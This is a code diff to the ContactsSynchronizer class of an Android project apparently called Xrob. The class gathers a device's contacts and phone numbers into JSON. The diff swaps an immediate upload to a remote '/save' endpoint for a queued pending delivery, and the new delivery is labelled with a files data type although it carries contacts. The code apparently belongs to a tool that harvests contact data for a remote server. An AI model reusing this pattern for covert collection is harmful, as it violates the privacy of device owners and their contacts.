@@ -4,8 +4,10 @@ import android.content.Context;
 import android.util.Log;
 
 import com.theah64.xrob.database.Contacts;
+import com.theah64.xrob.database.PendingDeliveries;
 import com.theah64.xrob.database.PhoneNumbers;
 import com.theah64.xrob.models.Contact;
+import com.theah64.xrob.models.PendingDelivery;
 import com.theah64.xrob.utils.APIRequestBuilder;
 import com.theah64.xrob.utils.APIResponse;
 import com.theah64.xrob.utils.OkHttpUtils;
@@ -60,7 +62,7 @@ public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {
 
                     final JSONObject joContact = new JSONObject();
                     joContact.put(Contacts.COLUMN_NAME, contact.getName());
-                    joContact.put(Contacts.COLUMN_ANDRIOD_CONTACT_ID, contact.getAndroidContactId());
+                    joContact.put(Contacts.COLUMN_ANDROID_CONTACT_ID, contact.getAndroidContactId());
 
                     if (contact.getPhoneNumbers() != null) {
 
@@ -77,42 +79,23 @@ public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {
                         }
 
 
-                        joContact.put(PhoneNumbers.TABLE_PHONE_NUMBERS, jaPhoneNumbers);
+                        joContact.put("phone_numbers", jaPhoneNumbers);
                     }
 
                     jaContacts.put(joContact);
                 }
 
-                //Building request
-                final Request contactsRequest = new APIRequestBuilder("/save", apiKey)
-                        .addParam(Xrob.KEY_ERROR, "false")
-                        .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_CONTACTS)
-                        .addParam(Xrob.KEY_MESSAGE, String.format(Locale.getDefault(), "%d contact(s) retrieved", jaContacts.length()))
-                        .addParam(Xrob.KEY_DATA, jaContacts.toString())
-                        .build();
 
+                final PendingDelivery pd = new PendingDelivery(
+                        null,
+                        false,
+                        Xrob.DATA_TYPE_FILES,
+                        String.format(Locale.getDefault(), "%d contact(s) retrieved", jaContacts.length()),
+                        jaContacts.toString()
+                );
 
-                OkHttpUtils.getInstance().getClient().newCall(contactsRequest).enqueue(new Callback() {
-                    @Override
-                    public void onFailure(Call call, IOException e) {
-                        e.printStackTrace();
-                    }
+                PendingDeliveries.getInstance(context).add(pd);
 
-                    @Override
-                    public void onResponse(Call call, Response response) throws IOException {
-
-                        try {
-
-                            new APIResponse(OkHttpUtils.logAndGetStringBody(response));
-
-                            //Success all contacts synced
-                            contactsTable.setAllContactsAndNumbersSynced();
-
-                        } catch (JSONException | APIResponse.APIException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                });
 
             } catch (JSONException e) {
                 e.printStackTrace();
